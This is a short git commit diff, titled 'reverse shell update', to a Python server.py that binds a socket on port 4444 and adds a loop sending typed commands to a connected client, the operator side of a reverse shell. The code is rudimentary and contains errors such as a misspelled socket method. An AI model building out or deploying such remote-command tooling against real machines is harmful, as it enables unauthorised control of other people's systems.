80fe21ed8e9fb4df58f06eb424cead3ebc20cefb
LexusG <33048777+LexusG@users.noreply.github.com>
2023-11-04 23:56:49 -0500

    reverse shell update

--- server.py
+++ server.py
@@ -7,7 +7,7 @@ PORT = 4444
 
 s = socket.socket()
 s.setsocket(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1 )
-s.bind((SERVER, PORT))
+s.bind((SERVER_IP, PORT))
 
 #Listen for an incoming connection 
 s.listen(1)
@@ -19,3 +19,6 @@ while True:
     print(f'[+] client connected {client[1]}')
 
     client[0].send('connected' .encode())
+    while True:
+        cmd = input('>>> ')
+        client[0].send(cmd  )
